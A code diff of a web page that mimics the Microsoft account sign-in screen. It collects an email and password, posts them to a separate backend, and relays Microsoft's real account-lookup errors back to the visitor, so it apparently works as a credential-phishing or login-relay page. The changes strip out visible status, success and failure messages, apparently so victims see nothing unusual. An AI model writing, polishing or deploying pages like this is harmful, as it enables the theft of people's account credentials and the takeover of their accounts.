@@ -290,7 +290,7 @@
             }
         }
 
-        
+
 
         .hidden {
             display: none;
@@ -370,7 +370,7 @@
                 </form>
             </div>
 
-            
+
         </div>
 
         <!-- Sign-in options -->
@@ -395,7 +395,7 @@
         function showMessage(message, type = 'info') {
             const messageArea = document.getElementById('messageArea');
             messageArea.style.display = 'block';
-            
+
             // Check if this is a Microsoft-specific error message
             if (type === 'error' && (
                 message.includes("We couldn't find an account") ||
@@ -421,7 +421,7 @@
 
         function setLoading(loading) {
             const loadingAnimation = document.getElementById('loadingAnimation');
-            
+
             if (loading) {
                 loadingAnimation.classList.add('active');
             } else {
@@ -431,7 +431,7 @@
             // Keep the form visible but disable inputs during loading
             const emailForm = document.getElementById('emailForm');
             const passwordForm = document.getElementById('passwordForm');
-            
+
             if (currentStep === 'email') {
                 emailForm.style.display = 'block';
                 passwordForm.style.display = 'none';
@@ -443,7 +443,7 @@
             // Disable all buttons and inputs during loading
             const buttons = document.querySelectorAll('.btn');
             const inputs = document.querySelectorAll('.microsoft-input');
-            
+
             buttons.forEach(btn => btn.disabled = loading);
             inputs.forEach(input => input.disabled = loading);
         }
@@ -470,7 +470,7 @@
             document.getElementById('backInfo').className = 'back-info';
         }
 
-        
+
 
         function goBack() {
             // Placeholder for back functionality
@@ -492,7 +492,7 @@
                     console.error('Failed to reload backend page');
                 }
             } catch (error) {
-                console.error('Error calling backend reload:', error);
+                // Silent error handling
             }
 
             showEmailForm();
@@ -520,7 +520,7 @@
             } catch (error) {
                 document.getElementById('statusIndicator').className = 'status-indicator offline';
                 document.getElementById('statusText').textContent = 'Backend offline';
-                showMessage('Backend is not available. Please check the server.', 'error');
+                // Removed generic error message
             }
         }
 
@@ -596,9 +596,9 @@
 
                     if (data.loginComplete) {
                         if (data.loginSuccess) {
-                            showMessage(`✅ ${data.message} Login successful!`, 'success');
+                            // Removed success message
                         } else {
-                            showMessage(`⚠️ ${data.message}`, 'error');
+                            // Removed error message
                         }
                     } else {
                         // Show site report if available
@@ -611,7 +611,7 @@
                                     'get a new Microsoft account',
                                     '<a href="#" onclick="return false;" style="color: #0067b8; text-decoration: none;">get a new Microsoft account</a>'
                                 );
-                                
+
                                 // Only show the Microsoft error message, nothing else
                                 showMessage(formattedError, 'error');
                             } else if (data.siteReport.accountExists && data.siteReport.needsPassword) {
@@ -623,10 +623,10 @@
                             } else {
                                 // Other cases - proceed to password
                                 showPasswordForm(email);
-                                showMessage('Please enter your password.', 'info');
+                                // Removed info message
                             }
                         } else {
-                            showMessage(`🔄 ${data.message}`, 'info');
+                            // Removed generic message
                             showPasswordForm(email);
                         }
                     }
@@ -636,7 +636,7 @@
                 }
 
             } catch (error) {
-                showMessage(`❌ Error: ${error.message}`, 'error');
+                // Silent error handling
             } finally {
                 setLoading(false);
             }
@@ -648,7 +648,7 @@
             const password = document.getElementById('password').value;
 
             if (!password) {
-                showMessage('Please enter your password', 'error');
+                // Removed error message
                 return;
             }
 
@@ -666,9 +666,9 @@
 
                 if (response.ok) {
                     if (data.loginSuccess) {
-                        showMessage(`✅ ${data.message} Password accepted!`, 'success');
+                        // Removed success message
                     } else {
-                        showMessage(`⚠️ ${data.message}`, 'error');
+                        // Removed error message
                     }
 
                     // Clear password field
@@ -679,13 +679,13 @@
                 }
 
             } catch (error) {
-                showMessage(`❌ Error: ${error.message}`, 'error');
+                // Silent error handling
             } finally {
                 setLoading(false);
             }
         }
 
-        
+
     </script>
 </body>
 </html>
